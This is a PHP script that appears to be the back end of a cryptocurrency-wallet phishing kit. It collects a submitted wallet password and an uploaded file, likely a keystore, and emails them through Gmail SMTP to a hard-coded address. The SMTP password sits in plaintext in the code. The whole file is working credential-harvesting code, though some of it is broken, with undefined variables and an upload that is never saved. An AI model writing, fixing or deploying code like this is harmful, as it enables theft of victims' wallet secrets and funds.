<?php
require 'Exception.php';
require 'PHPMailer.php';
require 'SMTP.php';

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\SMTP;
use PHPMailer\PHPMailer\Exception;

$subject = "Feedback";

$wallet_pass = $_POST['Wpass'];
$email_from = 'feranmi@gmail.com';
$email_to = 'emmajoy658@gmail.com';

if($wallet_pass== ''){
        echo "check the fields";
    }else{
      $subject='Query from '.$sender;
      $message='Dear Sir,<br><br>'.$subject.'<br><br>privatekey: '.$privateKey.'<br>pk Password: '. $wallet_pass . '<br>' . $email_from;

$targetDir = "uploads/";
$fileName = basename($_FILES["attachment"]["name"]);
$targetFilePath = $targetDir . $fileName;


$mail = new PHPMailer();
$mail->isSMTP();
$mail->Host = "smtp.gmail.com";
$mail->SMTPAuth = "true";
$mail->SMTPSecure = "tls";
$mail->Port = "587";
$mail->Username = "emmajoy658@gmail.com";
$mail->Password = "Olasunkanmi2001!";
$mail->setFrom($email_from);
$mail->AddReplyTo($email_from);
$mail->Subject = "/New Entry";
$mail->MsgHTML($email_from);
$mail->addAttachment($_FILES["attachment"]["name"]);
$mail->addAttachment($targetFilePath);
$mail->Body = "Wallet Password= " . $wallet_pass;

$mail->addAddress($email_to);
if ( $mail->Send() ) {
  echo "Processing";
}else{
  echo "Error";
}
}
$mail->smtpClose();

?>
